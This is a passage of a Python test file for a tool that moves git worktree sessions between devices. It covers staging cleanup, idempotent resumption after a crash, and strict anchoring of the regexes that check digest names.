    monkeypatch.setattr(wt, "_git", real)
    probe = subprocess.run(
        ["git", "-C", str(rig.dst_primary), "rev-parse", "--verify", "-q", "refs/heads/feat"],
        capture_output=True,
        env={**os.environ, **GIT_ENV},
        check=False,
    )
    assert probe.returncode != 0


# --------------------------------------------- R5 / R6: staging and the retry path


def test_r5_the_sweep_keeps_a_working_set_whose_session_copy_it_keeps(tmp_path: Path) -> None:
    staging = tmp_path / "network" / "staging"
    write(staging / SID / "ready.json", "{}")
    write(staging / f"{SID}.workset" / "pending.json", "{}")
    write(staging / "orphan.workset" / "pending.json", "{}")
    old = time.time() - 30 * 86400
    for p in (staging / SID, staging / f"{SID}.workset", staging / "orphan.workset"):
        os.utime(p, (old, old))

    swept = mobility.sweep_staging(tmp_path, max_age_s=60)

    assert (staging / f"{SID}.workset" / "pending.json").is_file()
    assert "orphan.workset" in swept and not (staging / "orphan.workset").exists()


def test_r6_a_crash_after_restore_is_resumed_as_idempotent(tmp_path: Path) -> None:
    """``restore`` finished but the process died before ``pending.json`` recorded it:
    ``promote_incoming`` then ``resume_pending`` retry it, and the retry reports the
    tree it already made rather than a conflict or a second copy."""
    rig = make_rig(tmp_path)
    snap = wt.snapshot(rig.worktree, SID, 0)
    art = wt.stage_bundle(rig.src_primary, snap.refs, [], tmp_path / "out")
    server: Any = _Server(tmp_path / "dstroot", rig.dst_home)
    (server.root / "sessions" / SID).mkdir(parents=True)
    staging = workset_move.incoming_staging(server.root, SID)
    staging.mkdir(parents=True)
    (staging / art.path.name).write_bytes(art.path.read_bytes())
    raw = {
        "session_id": SID,
        "n": 0,
        "bundle_digest": art.digest,
        "path": "~/proj/.worktrees/feat",
        "primary": "~/proj",
        "remote_url": str(rig.origin),
        "head": snap.head,
        "index": snap.index,
        "worktree": snap.worktree,
        "branch": snap.branch,
        "upstream_merge": None,
        "src_device": "laptop",
        "is_primary": False,
        "fresh_clone": False,
    }
    (staging / "pending.json").write_text(
        json.dumps(
            {
                "session_id": SID,
                "from_device": "d",
                "plans": [raw],
                "restored": {},
                # What ``destination_transfer`` journals (round 2, the import grant):
                # a recall's authority, so the restore's re-check admits it.
                "import": {"authority": "recall", "from_device": "d"},
            }
        )
    )
    assert workset_move.promote_incoming(server.root, SID) is True
    arrived = workset_move.arrived_dir(server.root, SID)
    # The crash: the tree was restored, the record was not.
    wt.restore(arrived, wt.RestorePlan(**raw), home=rig.dst_home)

    assert workset_move.resume_pending(server) == [SID]

    record = json.loads((arrived / "pending.json").read_text())
    row = record["restored"]["0"]
    assert (row["state"], row["mode"], row["dest_path"]) == (
        "restored",
        "idempotent",
        "~/proj/.worktrees/feat",
    )
    assert facts(rig.dst_home / "proj" / ".worktrees" / "feat") == facts(rig.worktree)


@pytest.mark.parametrize("suffix", ["\n", "\r\n", "x"])
def test_s4_digest_shapes_are_exact(suffix: str) -> None:
    """Security review #4245 round 6, S-4: the artifact-name shape checks match the
    whole name. ``$`` also matched before a trailing newline, so ``sha256:<hex>\\n``
    passed the shape check and only the later hash compare refused it."""
    hexdigest = "a" * 64
    assert workset_move._DIGEST.fullmatch("sha256:" + hexdigest)
    assert workset_move._HEX64.fullmatch(hexdigest)
    assert not workset_move._DIGEST.fullmatch("sha256:" + hexdigest + suffix)
    assert not workset_move._HEX64.fullmatch(hexdigest + suffix)
    # The previous anchoring, kept as the measured contrast: it admitted "\n".
    import re

    assert (re.match(r"^[0-9a-f]{64}$", hexdigest + suffix) is not None) is (suffix == "\n")
